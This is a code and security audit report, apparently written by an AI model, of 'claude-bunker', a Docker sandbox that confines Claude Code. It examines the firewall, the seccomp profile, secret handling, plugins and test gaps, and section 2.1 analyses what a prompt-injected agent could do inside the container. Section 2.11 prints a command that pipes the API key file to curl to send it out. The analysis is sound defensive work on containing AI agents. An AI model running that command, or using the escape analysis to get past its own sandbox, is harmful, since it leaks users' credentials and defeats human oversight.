# claude-bunker Deep Audit Report

**Date**: 2026-03-16
**Auditor**: Claude Opus 4.6 (1M context)
**Scope**: Full codebase review — architecture, security, DX, plugins, platform, scalability, reliability, testing

---

## 1. ARCHITECTURE REVIEW

### 1.1 Package Separation — **INFO: Fundamentally Sound**

The four-package model (`config`, `container`, `sandbox`, `platform`) is well-separated with clear responsibilities:

- **`config/`**: Pure data (loading, hashing, naming) — no Docker dependency. Clean.
- **`container/`**: Docker API wrapper only. All exec, build, copy ops live here.
- **`sandbox/`**: Claude Code-specific seeding. Depends on `container/` for writes but owns the "what" (settings, plugins, proxy).
- **`platform/`**: Pure terminal abstractions. No business logic leakage.

The **`internal/log/`** package (`log.go:1-31`) is a well-designed indirection layer — internal packages call `log.Warn()` and the `cmd` package wires it to styled output at startup (`run.go:200-201`). This avoids circular dependencies.

**One minor boundary issue**: `sandbox/proxy.go` imports `container` for constants (`SecretsDir`, `ContainerHome`) and `container.FileEntry` — this is acceptable since it's a data dependency, not a behavioral one.

### 1.2 Orchestration in cmd/run.go — **LOW: Acceptable Complexity**

`runInSandbox()` (`run.go:188-263`) is 76 lines and delegates well to method calls on `runner`. The `runner` struct (`run.go:36-65`) has 15 fields spanning infrastructure state, computed artifacts, user inputs, and runtime state — borderline god-object, but manageable at this scale.

The build→create→exec→cleanup pipeline reads linearly:
```
loadConfig → resolveNaming → resolveContainer → buildAndCreate → seedSettings → exec → cleanup
```

**Longest function**: `CreateAndStart` at `lifecycle.go:157-311` (~155 lines) handles mount construction, environment assembly, security config, container creation, and container start. This exceeds the 100-line threshold and should be decomposed into `buildMounts()` and `buildEnv()` helpers.

**Recommendation**: The pipeline is fine as-is. Decompose `CreateAndStart` for readability but no broader refactoring needed.

### 1.3 Two-Config System — **INFO: Well-Defined**

The boundary between `.claude/.claude-bunker/config.json` (infra) and `.claude/settings.json` (behavior) is clean:

- Config loading (`project.go:77-106`) explicitly handles only infrastructure fields
- Settings injection (`seed.go:64-76`) explicitly **skips** `settings.json` and `settings.local.json` when copying `.claude/` to prevent overriding managed-settings.json
- `managed-settings.json` is the enforcement layer (`seed.go:88-140`)

No concerns bleed between them.

### 1.4 Circular Dependencies — **INFO: None Found**

Dependency graph is a strict DAG:
```
cmd → {config, container, sandbox, platform, log}
sandbox → {config, container}
container → {config, log}
config → {log}
platform → {} (only stdlib + term)
log → {} (only stdlib)
```

### 1.5 Error Handling — **MEDIUM: Three Inconsistent Patterns**

The codebase uses **three distinct error output patterns**:

1. **`die()`/`warn()`/`info()`/`verbose()`** (`ui.go:39-81`) — styled, verbosity-aware. Used in `cmd/`.
2. **`log.Warn()`/`log.Warnf()`** (`log/log.go`) — delegates to function pointer wired by `cmd` at `run.go:200-201`. Used by `container/`, `config/`.
3. **`fmt.Fprintf(logW, "[claude-bunker] WARNING: ...")`** — direct `io.Writer` output, **bypasses verbosity system entirely**. Used extensively in `sandbox/seed.go:35,51,75,83` and `sandbox/plugins.go:110,113,123,134,150,153,169,182,251,289,578`.

The `logW` pattern is fragile: `seed.go:138` writes `"Wrote managed-settings.json with %d allowed domains"` regardless of `--quiet` unless the caller passes `io.Discard`. The caller at `run.go:438-443` does respect verbosity, but the indirection is error-prone.

Additional issues:
- **Before `bunkerlog.WarnFunc` is wired** (`run.go:200`), warnings use the default plain-text fallback, creating mixed output styles.
- Some internal functions return silently on error (e.g., `rewriteInstalledPlugins` at `plugins.go:202-254`).
- `config.EffectiveWorkdir` (`fingerprint.go:233-243`) hardcodes `"/workspace"` instead of using `container.ContainerWorkspace`, creating a silent coupling.

### 1.6 Docker Client Injection — **LOW: Acceptable**

`container.NewClient()` is called inline (`run.go:207`). The client is stored in `runner.cli` and threaded through all operations. Since the client is created once and used throughout, formal dependency injection adds complexity without testability gains (Docker API requires a real daemon anyway). The status/logs/prune commands create their own clients, which is appropriate.

---

## 2. SECURITY AUDIT

### 2.1 Prompt Injection Attack Surface — **INFO: Defense-in-Depth is Comprehensive**

Attack path analysis for a prompt injection inside the container:

1. **Can execute arbitrary code** as `claude-bunker` user (unprivileged, UID 1000)
2. **Cannot modify firewall** — iptables requires `NET_ADMIN` which is only effective for UID 0 (`lifecycle.go:276-290`)
3. **Cannot exfiltrate via network** — default-deny egress, only allowlisted IPs reachable
4. **Cannot DNS-tunnel** — DNS locked to Docker's resolver 127.0.0.11 (`init-firewall.sh:43-44`)
5. **Cannot modify managed-settings.json** — owned by root, chmod 444 (`seed.go:132-136`)
6. **Cannot modify domains file** — owned by root, chmod 444 (`lifecycle.go:355-358`)
7. **Cannot read secrets** — tmpfs at `/run/secrets` with mode 0700, files mode 0400, owned by `claude-bunker:claude-bunker` (so the user CAN read its own secrets — this is by design)
8. **Cannot escape to host filesystem** — workspace is the only bind mount; dotfiles are masked with `/dev/null` and tmpfs

### 2.2 Firewall Fail-Closed Design — **INFO: Correctly Implemented**

`init-firewall.sh:27-29` sets DROP policies **before** any allow rules:
```bash
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP
```

If the script crashes after line 29 but before allow rules, the container is locked down (fail-closed). The sanity check at line 32-38 verifies the policy took effect. The self-test at line 197-201 verifies non-allowlisted traffic is actually blocked.

**Partial execution scenario**: If the script crashes between setting DROP policies (line 29) and adding DNS rules (line 43), the container has no network at all — Claude Code will fail to start, and the user gets a clear error. This is the correct behavior.

### 2.3 TOCTOU Window — **MEDIUM: Real but Mitigated**

DNS resolution happens at container start (`init-firewall.sh:153-171`). If a CDN IP rotates between initial resolution and the first refresh (5 minutes, `refresh-firewall.sh:19`), allowed connections may break temporarily.

However:
- The `/24 subnet` strategy (`firewall-common.sh:56-82`) gives a 256-IP buffer per resolution, which covers most CDN rotations
- The `refresh-firewall.sh` daemon atomically swaps ipsets every 5 minutes
- The live `ESTABLISHED,RELATED` rule (`init-firewall.sh:69`) keeps existing connections alive

**Risk**: LOW in practice. CDN IPs typically rotate within the same `/24`. The 5-minute window is short.

### 2.4 managed-settings.json Tamper Resistance — **MEDIUM: File Protected, Directory NOT**

The file is `chmod 444` and owned by root (`seed.go:132-136`). However, `/etc/claude-code/` directory itself is **not** explicitly locked down — it's created during image build (`base.dockerfile.tmpl:38: mkdir -p {{.ManagedSettingsDir}}`).

**Attack scenario**: A prompt injection could potentially create a _new_ file in `/etc/claude-code/` (e.g., a different settings file) if the directory is writable by the container user. However, Claude Code specifically reads `managed-settings.json`, not arbitrary files.

**Mitigation check**: The directory is created as root during build, so it inherits root ownership. The container user cannot write to it. **No vulnerability**.

### 2.5 Secret Visibility — **HIGH: Mostly Secure, One Residual Risk**

**Protected channels**:
- Secrets written via `CopyMultipleToContainer` (tar pipe, not cmdline) — `lifecycle.go:459-491`
- Secrets stored in tmpfs files, not env vars — invisible to `docker inspect`
- Auth wrapper reads from files at exec time — `lifecycle.go:503-517`
- `/proc/*/environ` shows container env (no secrets), not auth wrapper exports

**Residual risk**: The auth wrapper script itself is readable by the container user (`chmod 755`, `lifecycle.go:517`). It contains commands like `export ANTHROPIC_API_KEY="$(cat /run/secrets/api_key)"` — the _command_ is visible but the _value_ is only resolved at runtime. The secret files themselves are `chmod 400` owned by `claude-bunker:claude-bunker` — so the container user CAN read them. This is by design (Claude Code needs to access the API key).

**`/proc/*/cmdline`**: The `ExecInteractive` command shows `~/.claude-auth-wrapper.sh claude [args]` — no secrets exposed.

**Shell history**: The auth wrapper uses `exec "$@"` so the token exports don't appear in bash history.

### 2.6 Seccomp Profile — **INFO: Appropriately Balanced**

The custom seccomp profile (`lifecycle.go:28-82`) blocks:
- `ptrace`, `process_vm_readv`, `process_vm_writev` — anti-debugging/injection
- `kexec_load/file_load` — kernel replacement
- `bpf` — eBPF programs
- `init/finit/delete_module` — kernel modules
- `reboot`, `swapon/off` — system control
- `perf_event_open` — performance monitoring (side-channel info)
- `userfaultfd` — exploitation primitive
- `open_by_handle_at` — container escape vector
- `personality` — security profile evasion
- `acct`, `add_key/keyctl/request_key` — misc privileged ops

Default is ALLOW — this is necessary because bubblewrap (Claude Code's sandbox) needs `clone`, `unshare`, `pivot_root`, `mount` which Docker's default profile blocks.

**Coverage assessment**: The blocklist covers the most dangerous escape vectors. Missing but low-risk: `io_uring_setup` (some container escapes use it), `move_mount` (new mount API). Not critical since the container user is unprivileged.

### 2.7 Devcontainer Feature Extraction — **INFO: Properly Hardened**

`features.go:181-225`:
- **Path traversal check**: `strings.HasPrefix(target, filepath.Clean(destDir)+string(os.PathSeparator))` (line 197)
- **Tar bomb defense**: `maxExtractFileSize = 500 MB` per file (line 178), enforced with `io.LimitReader` (line 217)
- **Symlink handling**: Symlinks in tar are silently skipped (switch only handles `TypeDir` and `TypeReg`)

**Extraction runs as host process** (before container creation, during `ResolveFeatures`), not inside the container. The extracted files go to a temp directory, then into the Docker build context tar. The feature's `install.sh` runs as root inside the Docker build, which is standard for devcontainer features.

### 2.8 /24 Subnet Strategy — **MEDIUM: Acceptable Tradeoff**

`firewall-common.sh:56-82` converts each IP to a `/24` CIDR. This means:
- Allowing `140.82.112.4` (GitHub) also allows `140.82.112.0-255` (255 neighboring IPs)
- CDN neighbors in the same `/24` are also accessible

**Real-world risk**: Most cloud providers (GitHub, Anthropic, Statsig) use dedicated IP ranges. A sophisticated attacker would need to co-locate on the same `/24` as an allowed service. This is theoretically possible on shared hosting but impractical for targeted attacks.

**Why it's necessary**: CDN round-robin DNS returns different IPs in the same `/24`. Without subnet allowlisting, connections would break on DNS rotation between refresh cycles.

### 2.9 IPv6 Blocking — **INFO: Robust**

`init-firewall.sh:83-94`:
```bash
if ip6tables -L -n >/dev/null 2>&1; then
    ip6tables -P INPUT   DROP
    ip6tables -P FORWARD DROP
    ip6tables -P OUTPUT  DROP
else
    echo "ip6tables not available — IPv6 already disabled by Docker"
fi
```
Handles both cases: ip6tables available (block all) and not available (Docker disabled IPv6). Localhost loopback is allowed for IPv6.

### 2.10 Apt Package Shell Injection — **INFO: Properly Validated**

`generate.go:13`: `var validAptPkg = regexp.MustCompile(``^[a-zA-Z0-9][a-zA-Z0-9.+\-:]+$``)`

Only alphanumeric, dots, plus, minus, colons allowed. Shell metacharacters (`;|$&<>(){}`) are rejected. Package names are embedded in `RUN apt-get install -y` — no injection possible.

### 2.11 postStartCommand Trust Model — **HIGH: Can Exfiltrate Secrets**

`lifecycle.go:397-408`: postStartCommand runs as `ContainerUser` at step 6 in `RunPostStart`, **after** auth secrets are injected at step 5 (`lifecycle.go:389-391`). Since secret files are `chmod 400 claude-bunker:claude-bunker`, the command can read them. The builtin domain list includes `api.github.com`, so a malicious `config.json` can exfiltrate credentials:
```
cat /run/secrets/api_key | curl -d @- https://api.github.com
```

The code has an explicit trust boundary comment (`lifecycle.go:396-401`) noting this matches the VS Code devcontainer trust model. The firewall limits blast radius to allowlisted domains only.

**onCreateCommand is worse** — it runs during `docker build` with **unrestricted** network access (`generate.go:97-107`, comment at line 98-101). No secrets are available during build, but arbitrary exfiltration to any host is possible.

### 2.12 OCI Feature Supply Chain — **LOW: Tags Not Pinned**

`features.go:152-162`: Features are pulled by tag (e.g., `ghcr.io/devcontainers/features/go:1`). The resolved digest is logged (`features.go:160-162`) but not enforced. A registry compromise or tag mutation would install different code without detection. Pinning by digest would require user-facing config changes.

### 2.13 managed-mcp.json Not Locked — **LOW: Inconsistency**

Unlike `managed-settings.json` (which gets explicit `chmod 444` at `seed.go:132-136`), `managed-mcp.json` is copied at default mode `0644` (`plugins.go:168`) with no subsequent permission hardening. A compromised container user could modify it.

### 2.14 Brief Open-Egress Window — **INFO: Millisecond-Scale**

`init-firewall.sh:18-29`: Between `iptables -F` (line 18, flush rules) and `iptables -P OUTPUT DROP` (line 29, set DROP policy), the default policy briefly reverts to ACCEPT. This ~millisecond window exists only during container initialization, not steady-state.

---

## 3. DEVELOPER EXPERIENCE

### 3.1 First-Run Experience — **MEDIUM: No Config Guidance**

When a user runs `claude-bunker` with no config, `LoadProjectConfig` (`project.go:77-85`) returns a zero-value config (no error). The tool proceeds to build and run with defaults — no prompt to run `claude-bunker init`.

**Issue**: Users may not know that `init` exists or that they should create a config. The first build succeeds but with no allowed domains beyond builtins, which may be confusing.

**Recommendation**: Add a first-run hint when no config file exists: "No config found. Run `claude-bunker init` to customize your sandbox."

### 3.2 Build Progress — **LOW: Adequate but Improvable**

- Non-verbose mode shows `Step N/M` progress lines (`build.go:201-203`)
- `--verbose` streams full Docker build output
- No spinner or progress bar, but `info("Building sandbox...")` appears before build

The concurrent pull + feature resolution (`build.go:66-86`) happens silently. A user might wait 30+ seconds with no feedback during feature downloads.

**Recommendation**: Add progress messages for feature pulls (currently only visible via `log.Infof` in verbose mode, `features.go:107`).

### 3.3 Build Error Surfacing — **INFO: Good**

Build errors are properly extracted from Docker's JSON stream (`build.go:195-197`) and surfaced via `die()`. The error message includes the Docker error text.

### 3.4 Init Wizard — **INFO: Well-Designed**

The multi-page wizard (`init.go:56-114`) is discoverable and complete:
- Language presets with version selection
- Conditional settings pages (only shown if toggled)
- Non-interactive fallback for CI (`init.go:51-53`)
- Concurrent version fetching while collecting settings

### 3.5 Config Validation — **MEDIUM: No Standalone Validator**

There is no `claude-bunker validate` or `claude-bunker doctor` command. Users must run a full build to discover config errors. The only validation is:
- Domain pattern validation (`project.go:142-156`)
- Apt package regex (`generate.go:54-55`)
- Feature ID regex (`generate.go:69-70`)
- Env key regex (`generate.go:81, 114`)

**Recommendation**: Add a `validate` subcommand that loads config, checks Docker availability, validates domains, and reports issues without building.

### 3.6 Version Upgrades — **LOW: Handled via Fingerprinting**

The image fingerprint includes the claude-bunker version (`fingerprint.go:28-30`). When the binary is upgraded, the fingerprint changes, triggering an automatic rebuild. The user sees "Image configuration changed — rebuilding sandbox..."

### 3.7 Verbose/Quiet System — **INFO: Well-Implemented**

Three levels (`-1`=quiet, `0`=normal, `1`=verbose) controlled by `--quiet`/`--verbose` flags and `CLAUDE_BUNKER_QUIET` env var. Internal packages use `log.Warn/Info` which respects verbosity via function pointers.

### 3.8 No Dry-Run Mode — **LOW**

No `--dry-run` for prune or rebuild. The `prune` command does have `--force` and interactive confirmation (`prune.go:130-133`), which is adequate.

### 3.9 CI/CD Behavior — **INFO: Well-Handled**

- `isTTY()` check guards all interactive prompts (`ui.go:118-120`)
- `init` writes empty config in non-interactive mode (`init.go:51-53`)
- `prune` warns about non-interactive terminal (`prune.go:91-92`)
- `CLAUDE_BUNKER_QUIET=1` suppresses all info output

---

## 4. PLUGIN & MCP SERVER HANDLING

### 4.1 Stdio MCP Servers — **INFO: Warning-Only, Correct**

`batchCheckRuntimes()` (`plugins.go:542-582`) checks if required binaries exist in the container via a single `which` exec. Missing runtimes produce a WARNING with guidance to add via `apt` or `features`. They do **not** block startup — this is correct since the MCP server may work anyway (e.g., via `npx` auto-install).

### 4.2 HTTP/SSE Domain Flow — **INFO: Correctly Dual-Listed**

Full trace:
1. `.mcp.json` → `ExtractPluginDomains()` (`plugins.go:28-86`) extracts domains
2. Domains appended to `r.extraDomains` (`run.go:300-301`)
3. **Firewall path**: `extraDomains` → `RunPostStart` → `DomainsFilePath` → `init-firewall.sh` resolves to IPs
4. **Sandbox path**: `extraDomains` → `SeedSettings` → `writeManagedSettings` → `managed-settings.json`'s `allowedDomains`

Both firewall (IP-level) and sandbox (domain-level) are populated from the same domain list. Correct.

### 4.3 Plugin Path Rewriting — **MEDIUM: Windows Coverage Adequate**

`rewritePathField()` (`plugins.go:295-306`) normalizes with `filepath.ToSlash()` and does prefix replacement. This handles:
- Windows `C:\Users\...` → `/home/claude-bunker/.claude/...`
- Forward-slash Windows paths (`C:/Users/...`)

**Not explicitly handled**: UNC paths (`\\server\share\...`), WSL paths (`/mnt/c/...`). These are edge cases that would fail silently (prefix wouldn't match, path left unchanged). Acceptable since WSL users typically use Linux-native paths.

### 4.4 Plugin Level Hierarchy — **INFO: Correctly Implemented**

`PluginLevelAtLeast()` (`project.go:56-58`) uses numeric ordering:
```go
pluginLevelOrder = map[string]int{
    "project": 1, "user": 2, "all": 3,
}
```

- `project`: Only reads `.mcp.json` from workspace
- `user`: Above + `~/.claude/settings.json`, `~/.claude.json`, plugin cache
- `all`: Above + `managed-mcp.json` (enterprise)

### 4.5 MCP Config Formats — **INFO: Both Handled**

`extractMCPDomainsFromData()` (`plugins.go:328-344`) tries nested format first (`mcpServers: { name: { url: ... } }`), then flat format (`name: { url: ... }`). Tests verify both paths (`plugins_test.go:217-238`).

### 4.6 enableAllProjectMcpServers — **INFO: Always Injected**

`seed.go:115-117` injects `enableAllProjectMcpServers: true` whenever `PluginLevel != ""`. This is correctly gated.

### 4.7 Silent Failures — **MEDIUM: Several Swallowed Errors**

- `extractMCPDomains()` returns `nil` on file read error or parse error — no logging (`plugins.go:319-324`)
- `rewriteInstalledPlugins()` silently returns on JSON parse error (`plugins.go:213-215`)
- `walkPluginCacheMCPUncached()` silently skips unreadable directories (`plugins.go:396-398`)
- Plugin cache domain validation silently drops invalid domains (`plugins.go:79-83`)

These are intentional (external configs may be absent or malformed) but a `verbose`-level log would help debugging.

### 4.8 streamableHttp Transport — **MEDIUM: Not Handled**

The code checks for `url` field (`plugins.go:350-353`) which covers `http` and `sse` transports. The newer `streamableHttp` transport type also uses a `url` field, so it **is** handled for domain extraction. However, the code doesn't explicitly recognize the transport type field — if a future transport uses a different field name for the endpoint, it would be missed.

### 4.9 MCP Server Auth (OAuth) — **LOW: Not Handled**

Remote MCP servers with OAuth authentication may need additional token injection. This is not currently supported. Low priority since most enterprise deployments use managed-mcp.json.

---

## 5. DEV ENVIRONMENT HANDLING

### 5.1 Windows Terminal Resize — **INFO: Correctly Implemented**

`resize_windows.go` uses 500ms polling (`line 22`). `resize_unix.go` uses `SIGWINCH`. Both share `delayedResize()` for initial sizing. The polling approach is standard for Windows.

**CPU cost**: 500ms polling with a simple `term.GetSize()` syscall is negligible (< 0.1% CPU).

### 5.2 VT100 Mode — **INFO: Correctly Implemented**

`vt_windows.go:19-32` enables both `ENABLE_VIRTUAL_TERMINAL_INPUT` (stdin) and `ENABLE_VIRTUAL_TERMINAL_PROCESSING` (stdout). Errors are silently ignored (correct — older Windows versions may not support VT).

### 5.3 WSL2 Detection — **LOW: Not Explicitly Handled**

There's no WSL2-specific detection. The tool relies on Docker being available via the standard Docker socket. This works with both Docker Desktop (which auto-configures WSL2 integration) and native Docker in WSL2.

### 5.4 macOS Consistency Hint — **LOW: Harmless Legacy**

`lifecycle.go:170`: `Consistency: mount.ConsistencyDelegated` — this hint was relevant for older Docker Desktop versions with osxfs. Modern Docker Desktop uses VirtioFS where this is a no-op. Harmless to keep.

### 5.5 Linux / Rootless Docker / Podman — **HIGH: Rootless Breaks Firewall**

- No systemd dependency — uses Docker API directly (though `dockerStartHint()` in `client.go` assumes systemd for its hint message)
- No cgroups v2 assumption — Docker abstracts this
- **Rootless Docker** (`lifecycle.go:293`): `CapAdd: []string{"NET_ADMIN", "NET_RAW"}` — rootless Docker cannot grant these capabilities. The container starts but `init-firewall.sh` fails, triggering `die()` at `run.go:415-416`. This is fail-closed (correct) but the error message doesn't mention rootless Docker as the cause. Users get a cryptic iptables error.
- **Podman**: Untested. Multiple likely failure points: different seccomp handling with crun/crio, same NET_ADMIN issue in rootless mode, `apparmor=unconfined` may conflict with SELinux, `ContainerExecInspect` API compatibility for `HasOtherActiveSessions` is unverified.

### 5.6 CI/CD (Headless) — **MEDIUM: No TTY Guard on Main Command**

`exec.go:51-54`: `MakeRaw()` is called without first checking if stdin is a terminal. In headless CI (no TTY), `term.MakeRaw()` fails with "inappropriate ioctl for device". The `isTTY()` check exists in `ui.go:118-120` and is used by `init` and `prune`, but **not** by the main run command. Users get a raw terminal error instead of a clear "no TTY available" message.

### 5.7 Proxy Detection — **INFO: Comprehensive**

`proxy.go:41-95`:
- Checks both `HTTPS_PROXY` and `https_proxy` (case fallback)
- Validates cert file paths exist
- Warns about embedded credentials
- Extracts proxy hostname for firewall allowlisting
- Remaps cert paths to container paths

HTTPS_PROXY with authentication (user:pass@host) is detected and warned about but forwarded as-is.

### 5.8 Signal Handling — **INFO: Correct**

`run.go:482-495`:
- `SIGINT` ignored (Ctrl+C goes to container process via raw TTY)
- `SIGTERM/SIGHUP` trigger cleanup then exit
- Terminal state saved globally (`platform/tty.go:13-15`) for recovery in signal handlers

---

## 6. SCALABILITY & EFFICIENCY

### 6.1 Build Performance — **INFO: Well-Optimized**

- **GHCR base image pull** runs concurrently with feature resolution (`build.go:66-86`)
- **Reproducible mod times** (`build.go:24`) ensure Docker layer cache hits
- **TZ build arg** placed after apt-get to avoid cache busting (`base.dockerfile.tmpl:27`)
- **Cached build artifacts** (`BuildCache` struct) avoid recomputation between fingerprinting and building

Cold build: ~2-5 minutes (mostly Claude Code install via curl).
Warm build (cached): ~1-2 seconds (fingerprint check only).

### 6.2 Feature Caching — **MEDIUM: Re-Downloaded Every Build**

`ResolveFeatures()` (`features.go:68-148`) downloads features from OCI registries every time an image build is needed. Features are extracted to temp directories and cleaned up after build.

**Impact**: Each feature download is ~1-10 seconds. With 5+ features, this adds 30-60 seconds to each rebuild.

**Recommendation**: Cache downloaded features locally (hash by OCI digest) to avoid redundant downloads.

### 6.3 Memory Usage — **LOW: Bounded**

- Build context tar is in-memory (`build.go:224-291`). For a typical build (Dockerfile + scripts + a few features), this is ~1-10 MB.
- `maxExtractFileSize = 500 MB` (`features.go:178`) bounds individual extracted files.
- No aggregate size limit on build context tar — with many large features, memory could spike.

### 6.4 Fingerprint Efficiency — **INFO: Negligible Overhead**

SHA-256 hashing of the Dockerfile + scripts + config is sub-millisecond. File I/O is a single read of a ~130-byte cache file. Not a bottleneck.

### 6.5 Container Startup Time — **LOW: Sequential but Acceptable**

`RunPostStart` (`lifecycle.go:327-411`) executes sequentially:
1. Git config (1 exec) — ~100ms
2. Write domains file (1 copy) — ~50ms
3. Lock domains file (1 exec) — ~50ms
4. Run init-firewall.sh (1 exec) — ~2-5s (DNS resolution is the bottleneck)
5. Start refresh daemon (1 exec) — ~50ms
6. Copy git identity (1 exec) — ~100ms
7. Inject auth secrets (1 exec) — ~100ms
8. postStartCommand (1 exec, optional) — user-defined

Total: ~3-6 seconds. DNS resolution dominates. Non-critical domains are resolved in parallel (`init-firewall.sh:157-171`).

### 6.6 HasOtherActiveSessions — **LOW: Scales Adequately**

`lifecycle.go:597-616` iterates all exec IDs and inspects each one. With typical usage (1-5 exec sessions), this is <500ms. Docker automatically cleans up completed exec sessions, so stale IDs don't accumulate indefinitely.

### 6.7 Scaling Limits — **LOW**

- **50+ features**: Build context tar could reach ~100 MB. Docker handles this fine.
- **100+ domains**: DNS resolution at startup would take ~30-60 seconds (parallelized). Refresh daemon handles ongoing resolution.
- **Very large workspaces**: Bind-mounted, so no copy overhead. Initial `CopyDirToContainerExec` for `.claude/` tree is bounded by `.claude/` size, not workspace size.

---

## 7. RELIABILITY & ERROR HANDLING

### 7.1 Crash Recovery — **MEDIUM: Orphaned Containers Possible**

If `claude-bunker` is killed with `SIGKILL` (or power loss):
- **Container**: Left running (`sleep infinity`). Found by `FindByLabel` on next run.
- **Volumes**: Persist (by design for bash history and claude config).
- **Fingerprint cache**: On disk at `~/.cache/claude-bunker/`. May be stale.

On next run, `resolveContainer()` (`run.go:306-358`) finds the running container and either reuses it (if fingerprints match) or stops/removes it (if changed). **Recovery is automatic**.

### 7.2 Partial Build Recovery — **INFO: Docker Handles This**

Docker build failures leave intermediate layers cached. The user can retry without `--rebuild` and Docker picks up where it left off. With `--rebuild`, all caches are cleared (`run.go:223-232`).

### 7.3 Network Failure Handling — **MEDIUM: Partially Handled**

- **Docker Hub unreachable**: `tryPullBaseImage` has a 60-second timeout (`build.go:133`) and returns `false` on failure, falling back to local build. Good.
- **GHCR unreachable**: Same pull fallback applies.
- **endoflife.date unreachable**: `FetchSupportedVersions` (in init wizard) falls back to hardcoded `CommonVersions`. Good.
- **DNS failure during firewall init**: Critical domain failure exits with error. Non-critical domains are skipped with WARNING. Good.
- **No retry on Docker API failures**: Most Docker API calls are not retried. A transient Docker daemon issue causes immediate failure.

### 7.4 Container Death During Exec — **INFO: Clean Exit**

`exec.go:85-91` waits on `outputDone` channel. If the container dies, the output stream closes, `outputDone` receives the error, and `ExecInteractive` returns. Exit code inspection may fail (container gone), returning -1. The caller (`run.go:518-521`) sets exit code to 1 on error.

### 7.5 Silent Failure Catalog — **HIGH**

| Location | What's swallowed | Impact |
|----------|-----------------|--------|
| `run.go:96` | `StopAndRemove` error | LOW — cleanup best-effort |
| `run.go:269-271` | Config parse error downgraded to warn | **HIGH** — user proceeds with empty config, all security customizations silently dropped |
| `run.go:345-349` | Container stop/remove errors logged as `verbose()` only | **MEDIUM** — root cause obscured if subsequent create fails with name conflict |
| `run.go:425-427` | `fpResult.Save()` failure as warn | MEDIUM — next run unnecessarily rebuilds |
| `run.go:455-457` | Settings seed failure as warn | **HIGH** — if `writeManagedSettings()` fails, sandbox domain restrictions are not active, weakening security |
| `run.go:469-471` | `InjectAuthSecrets()` failure during reuse as warn | MEDIUM — auth tokens may be missing |
| `lifecycle.go:379` | Refresh daemon start failure as warn | LOW — firewall still works, just no refresh |
| `lifecycle.go:385` | Git identity copy failure as warn | LOW — cosmetic |
| `plugins.go:113-114` | Settings read failure as warn | LOW — plugins may not work |
| `plugins.go:205-215` | `rewriteInstalledPlugins` returns silently on all errors | LOW — plugin paths may be wrong |
| `plugins.go:319-324` | MCP domain extraction returns nil on error | LOW — domains just not added |
| `plugins.go:562-565` | `batchCheckRuntimes` exec failure silently returns | LOW — runtime warnings are informational |

**Two critical silent failures**:
1. `run.go:269-271` — config parse error is **warned** but execution continues with empty config. All domains, features, packages silently dropped. **Should be `die()`**.
2. `run.go:455-457` — `SeedSettings()` failure is **warned** but continues. If `writeManagedSettings()` fails, the container runs without managed-settings.json, meaning the bubblewrap sandbox domain restrictions are not enforced. **Should be `die()`**.

### 7.6 Concurrent Access — **MEDIUM: No Lock File**

Two `claude-bunker` processes for the same project could:
- Both compute fingerprints simultaneously (benign — pure computation)
- Both try to create/start the same container name (Docker rejects with conflict error)
- Race on fingerprint cache file writes (last writer wins — could cause unnecessary rebuilds)

**Impact**: The Docker API itself serializes container creation by name. The worst case is a confusing error message about name conflicts. No data loss.

### 7.7 Cleanup Reliability — **INFO: Has Timeout**

`runner.cleanup()` (`run.go:69-97`) uses a 15-second timeout context (`run.go:88`). If cleanup hangs (Docker daemon unresponsive), it times out and exits. The mutex prevents double-cleanup from concurrent signal handlers.

---

## 8. TEST COVERAGE ASSESSMENT

### 8.1 Package Coverage Summary

| Package | Has Tests | Test File | Coverage |
|---------|-----------|-----------|----------|
| `cmd/` | Yes | `run_test.go` | Flag extraction only |
| `internal/config/` | Yes | `fingerprint_test.go`, `project_test.go`, `naming_test.go`, `expand_test.go` | Good — fingerprints, config loading, validation, env expansion |
| `internal/container/` | Yes | `build_test.go`, `generate_test.go`, `features_test.go`, `presets_test.go` | Good — Dockerfile generation, feature sorting, tar context |
| `internal/sandbox/` | Yes | `plugins_test.go`, `proxy_test.go`, `seed_test.go` | Good — MCP domain extraction, proxy detection, path encoding |
| `internal/platform/` | **No** | — | **No tests** |
| `internal/log/` | **No** | — | No tests (trivial) |

### 8.2 Critical Untested Paths

1. **No integration tests** — No test builds an image, creates a container, or runs exec. All tests are unit tests operating on pure functions.

2. **Firewall scripts untested** — `init-firewall.sh`, `refresh-firewall.sh`, `firewall-common.sh` have no test coverage. They are the most security-critical components.

3. **Container lifecycle untested** — `CreateAndStart`, `RunPostStart`, `InjectAuthSecrets`, `StopAndRemove` — all require a Docker daemon and are not tested.

4. **Exec path untested** — `ExecInteractive`, `ExecNonInteractive` — require running container.

5. **Platform code untested** — TTY handling, resize listeners, VT mode. Would need platform-specific test environments.

6. **Copy operations untested** — `CopyContentToContainer`, `CopyDirToContainerExec`, `CopyMultipleToContainer` — require running container.

### 8.3 What IS Well-Tested

- **Fingerprint determinism and change detection** (`fingerprint_test.go`) — 12 tests covering all permutations
- **Config loading and validation** (`project_test.go`) — valid, invalid, missing configs; domain validation
- **Dockerfile generation** (`generate_test.go`) — features, apt, env, onCreateCommand, end-with-USER
- **Feature sorting** (`features_test.go`) — alphabetical, dependencies, transitive deps, cycles
- **Flag extraction** (`run_test.go`) — 15 test cases covering all flag forms
- **MCP domain extraction** (`plugins_test.go`) — both formats, deduplication, invalid domains
- **Proxy detection** (`proxy_test.go`) — empty, with proxy, lowercase fallback
- **Env var expansion** (`expand_test.go`) — various syntaxes

### 8.4 Highest Risk-Reduction Tests

1. **Firewall script test** (CRITICAL): A container-based integration test that runs `init-firewall.sh`, verifies DROP policies, verifies allow rules, tests the self-test
2. **Secret visibility test** (HIGH): Verify tokens don't appear in `docker inspect`, `/proc/*/environ`, `/proc/*/cmdline`
3. **Path traversal test for `exclude` config** (HIGH): Verify `../../etc` paths are rejected in container mount setup
4. **managed-settings.json tamper test** (MEDIUM): Verify container user cannot write to `/etc/claude-code/`
5. **Config parse error test** (MEDIUM): Verify behavior when config.json is invalid JSON

---

## 9. VERDICT & RECOMMENDATIONS

### 9.1 Architecture Verdict

**The architecture is fundamentally sound.** The package structure is clean, responsibilities are well-separated, and the orchestration flow is linear and readable. No significant refactoring is needed.

The two-config system is well-designed and the five security layers provide genuine defense-in-depth. The codebase is concise (~3,500 lines of Go + ~300 lines of shell) with no bloat.

### 9.2 Top 5 Critical Issues

1. **HIGH — Two silent failures can weaken sandbox security**:
   - `run.go:269-271`: Config parse error warns but continues with empty config — all domains, features, packages silently dropped.
   - `run.go:455-457`: `SeedSettings()` failure warns but continues — `managed-settings.json` may not be written, disabling bubblewrap domain restrictions.
   **Fix**: Change both `warn()` calls to `die()`.

